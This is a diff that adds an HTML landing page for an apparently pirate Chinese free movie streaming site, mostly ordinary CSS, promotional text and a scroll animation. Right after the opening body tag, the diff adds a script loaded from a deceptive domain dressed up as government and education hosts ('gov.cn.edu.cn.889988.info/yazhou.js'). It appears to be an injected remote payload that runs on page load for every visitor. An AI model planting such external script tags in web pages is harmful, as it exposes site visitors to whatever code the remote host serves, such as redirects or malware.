@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>免费在线电影网 - 海量高清影视免费看</title>
+    <meta name="description" content="免费在线电影网(mianfeizaixiandianyingwang-app)提供最新院线大片、热播剧集、动漫综艺在线观看。高清流畅不卡顿，尽在免费在线电影网！">
+    <meta name="keywords" content="免费在线电影网, 免费电影, 在线电影, 高清影视, mianfeizaixiandianyingwang-app">
+    <style>
+        :root {
+            --bg-color: #0f0c29;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --primary: #00f2fe;
+            --secondary: #fe0979;
+            --text-main: #ffffff;
+            --text-muted: #a0a0d0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            color: var(--text-main);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* 动态背景光晕 */
+        .glow-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: -1;
+            opacity: 0.5;
+        }
+        .orb-1 { top: -10%; left: -10%; width: 50vw; height: 50vw; background: var(--primary); }
+        .orb-2 { bottom: -10%; right: -10%; width: 60vw; height: 60vw; background: var(--secondary); }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* 头部导航 */
+        header {
+            padding: 20px 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            background: rgba(15, 12, 41, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            color: var(--text-main);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            font-size: 0.95rem;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        /* 英雄区域 */
+        .hero {
+            padding: 180px 0 100px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin: 0 auto 40px;
+        }
+
+        .url-box {
+            display: inline-block;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 15px 30px;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            font-family: monospace;
+            font-size: 1.1rem;
+            color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2);
+        }
+
+        /* 栏目区域 */
+        .section {
+            padding: 80px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.2rem;
+            margin-bottom: 50px;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 60px;
+            height: 4px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            margin: 15px auto 0;
+            border-radius: 2px;
+        }
+
+        /* 玻璃拟态卡片 */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-color: rgba(0, 242, 254, 0.3);
+        }
+
+        .card h3 {
+            font-size: 1.4rem;
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+
+        .card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+        }
+
+        /* 底部 */
+        footer {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 50px;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* 移动端适配 */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none; /* 移动端简化导航 */
+            }
+            .hero {
+                padding: 150px 0 60px;
+            }
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+            .hero p {
+                font-size: 1rem;
+            }
+            .url-box {
+                font-size: 0.9rem;
+                padding: 10px 20px;
+            }
+            .section {
+                padding: 50px 0;
+            }
+            .section-title {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+    <!-- 动态背景 -->
+    <div class="glow-orb orb-1"></div>
+    <div class="glow-orb orb-2"></div>
+
+    <header>
+        <div class="container">
+            <nav>
+                <a href="#" class="logo">免费在线电影网</a>
+                <div class="nav-links">
+                    <a href="#home">首页</a>
+                    <a href="#movies">电影库</a>
+                    <a href="#series">剧集</a>
+                    <a href="#about">关于我们</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- 首页 Banner -->
+        <section class="hero" id="home">
+            <div class="container">
+                <h1>免费在线电影网</h1>
+                <p>畅享海量高清影视资源，最新大片、经典老片、热播剧集一网打尽，极速播放不等待。</p>
+                <div class="url-box">
+                    官方网址: https://mianfeizaixiandianyingwang-app
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目一：电影库 -->
+        <section class="section" id="movies">
+            <div class="container">
+                <h2 class="section-title">精选电影库</h2>
+                <div class="grid">
+                    <div class="card">
+                        <h3>最新院线大片</h3>
+                        <p>同步更新全球最新上映电影，1080P高清画质，提供免费在线电影网独家资源。</p>
+                    </div>
+                    <div class="card">
+                        <h3>经典怀旧老片</h3>
+                        <p>收录上世纪经典影视作品，重温岁月记忆，感受时代变迁。</p>
+                    </div>
+                    <div class="card">
+                        <h3>高分口碑佳作</h3>
+                        <p>IMDb、豆瓣高分榜单实时更新，拒绝片荒，发现好电影。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：热播剧集 -->
+        <section class="section" id="series" style="background: rgba(0,0,0,0.2);">
+            <div class="container">
+                <h2 class="section-title">热播剧集速递</h2>
+                <div class="grid">
+                    <div class="card">
+                        <h3>内地热播剧</h3>
+                        <p>热门古装、现代都市剧集，每日更新，追剧不停歇。</p>
+                    </div>
+                    <div class="card">
+                        <h3>欧美剧集</h3>
+                        <p>最新美剧、英剧同步更新，中英双语字幕，满足不同需求。</p>
+                    </div>
+                    <div class="card">
+                        <h3>日韩剧集</h3>
+                        <p>热门韩剧、日剧资源，独家翻译，第一时间观看。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目三：动漫综艺 -->
+        <section class="section" id="anime">
+            <div class="container">
+                <h2 class="section-title">动漫与综艺</h2>
+                <div class="grid">
+                    <div class="card">
+                        <h3>新番动漫</h3>
+                        <p>日本最新季番动漫，国漫精品，高清在线观看。</p>
+                    </div>
+                    <div class="card">
+                        <h3>热门综艺</h3>
+                        <p>全网热门综艺节目，搞笑、真人秀、选秀节目应有尽有。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section class="section" id="about" style="background: rgba(0,0,0,0.2);">
+            <div class="container" style="text-align: center; max-width: 800px;">
+                <h2 class="section-title">关于 免费在线电影网</h2>
+                <p style="color: var(--text-muted); margin-bottom: 20px;">
+                    <strong style="color: var(--primary);">免费在线电影网</strong> 致力于为用户提供最优质的免费影视服务。
+                    我们的网址是：<a href="https://mianfeizaixiandianyingwang-app" style="color: var(--secondary);">https://mianfeizaixiandianyingwang-app</a>。
+                </p>
+                <p style="color: var(--text-muted);">
+                    平台拥有海量片源，涵盖电影、电视剧、动漫、综艺等多个频道。我们坚持免费、高清、流畅的服务理念，让您随时随地享受观影乐趣。
+                </p>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 免费在线电影网. 网址: https://mianfeizaixiandianyingwang-app</p>
+            <p style="margin-top: 10px; font-size: 0.8rem;">免责声明：本站仅提供网页服务，所有内容均来自互联网分享。</p>
+        </div>
+    </footer>
+
+    <script>
+        // 简单的滚动动画效果
+        document.addEventListener('DOMContentLoaded', () => {
+            const cards = document.querySelectorAll('.card');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.opacity = 1;
+                        entry.target.style.transform = 'translateY(0)';
+                    }
+                });
+            }, { threshold: 0.1 });
+
+            cards.forEach(card => {
+                card.style.opacity = 0;
+                card.style.transform = 'translateY(20px)';
+                card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                observer.observe(card);
+            });
+        });
+    </script>
+</body>
+</html>
